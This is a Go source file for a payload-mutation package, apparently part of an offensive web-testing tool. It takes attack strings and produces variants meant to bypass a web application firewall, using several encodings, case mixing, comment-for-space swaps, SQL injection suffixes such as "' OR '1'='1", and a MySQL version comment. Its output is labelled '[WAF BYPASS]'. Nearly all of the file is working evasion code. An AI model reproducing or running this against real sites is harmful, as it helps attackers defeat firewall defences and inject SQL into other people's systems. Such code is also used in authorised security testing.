package mutation

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"math/big"
	"strings"
	"sync"
	"time"
)

type MutationResult struct {
	Original    string
	Mutations   []string
	Timestamp   time.Time
	RateLimited bool
}

var (
	mu                    sync.RWMutex
	mutationLog           []MutationResult
	maxLogSize            = 10000
	rateLimitMu           sync.Mutex
	mutationCounts        map[string]*rateCounter
	rateLimitWindow       = 60 * time.Second
	maxMutationsPerWindow = 100
)

type rateCounter struct {
	count       int
	windowStart time.Time
}

func init() {
	mutationCounts = make(map[string]*rateCounter)
}

func isRateLimited(payload string) bool {
	rateLimitMu.Lock()
	defer rateLimitMu.Unlock()

	now := time.Now()
	rc, exists := mutationCounts[payload]
	if !exists || now.Sub(rc.windowStart) > rateLimitWindow {
		mutationCounts[payload] = &rateCounter{count: 1, windowStart: now}
		return false
	}
	rc.count++
	return rc.count > maxMutationsPerWindow
}

func logMutation(original string, mutations []string) {
	mu.Lock()
	defer mu.Unlock()

	mutationLog = append(mutationLog, MutationResult{
		Original:    original,
		Mutations:   mutations,
		Timestamp:   time.Now(),
		RateLimited: isRateLimited(original),
	})

	if len(mutationLog) > maxLogSize {
		mutationLog = mutationLog[len(mutationLog)-maxLogSize:]
	}
}

func GetMutationLog() []MutationResult {
	mu.RLock()
	defer mu.RUnlock()
	cpy := make([]MutationResult, len(mutationLog))
	copy(cpy, mutationLog)
	return cpy
}

func Mutate(payload string) []string {
	if isRateLimited(payload) {
		return nil
	}

	var results []string
	results = append(results, urlEncode(payload))
	results = append(results, doubleURLEncode(payload))
	results = append(results, htmlEncode(payload))
	results = append(results, base64Encode(payload))
	results = append(results, hexEncode(payload))
	results = append(results, "'"+payload)
	results = append(results, "\""+payload)
	results = append(results, payload+"--")
	results = append(results, payload+"#")
	results = append(results, payload+"' OR '1'='1")
	results = append(results, strings.Replace(payload, " ", "/**/", 1))
	results = append(results, caseMix(payload))

	logMutation(payload, results)
	return results
}

func LLMVariants(payload string) []string {
	if isRateLimited(payload) {
		return nil
	}
	results := []string{
		payload + " /*!12345*/",
		payload + " &",
		strings.ToUpper(payload),
		strings.ToLower(payload),
	}
	logMutation(payload+"[llm]", results)
	return results
}

func Prompt(payload string, all []string) string {
	return fmt.Sprintf("\n[WAF BYPASS] Payload '%s' blocked. Generated %d mutations to try.\n", payload, len(all))
}

func urlEncode(s string) string {
	result := ""
	for _, c := range s {
		switch c {
		case ' ', '\'', '"', '(', ')', '=', ';', '<', '>':
			result += fmt.Sprintf("%%%02X", c)
		default:
			result += string(c)
		}
	}
	return result
}

func doubleURLEncode(s string) string {
	return urlEncode(urlEncode(s))
}

func htmlEncode(s string) string {
	result := ""
	for _, c := range s {
		switch c {
		case '<':
			result += "&lt;"
		case '>':
			result += "&gt;"
		case '&':
			result += "&amp;"
		case '\'':
			result += "&#39;"
		case '"':
			result += "&quot;"
		default:
			result += string(c)
		}
	}
	return result
}

func base64Encode(s string) string {
	return base64.StdEncoding.EncodeToString([]byte(s))
}

func hexEncode(s string) string {
	result := ""
	for _, c := range s {
		result += fmt.Sprintf("%%%02X", c)
	}
	return result
}

func caseMix(s string) string {
	result := make([]byte, len(s))
	for i, c := range s {
		n, _ := rand.Int(rand.Reader, big.NewInt(2))
		if n.Int64() == 0 && c >= 'a' && c <= 'z' {
			result[i] = byte(c - 32)
		} else if n.Int64() == 1 && c >= 'A' && c <= 'Z' {
			result[i] = byte(c + 32)
		} else {
			result[i] = byte(c)
		}
	}
	return string(result)
}
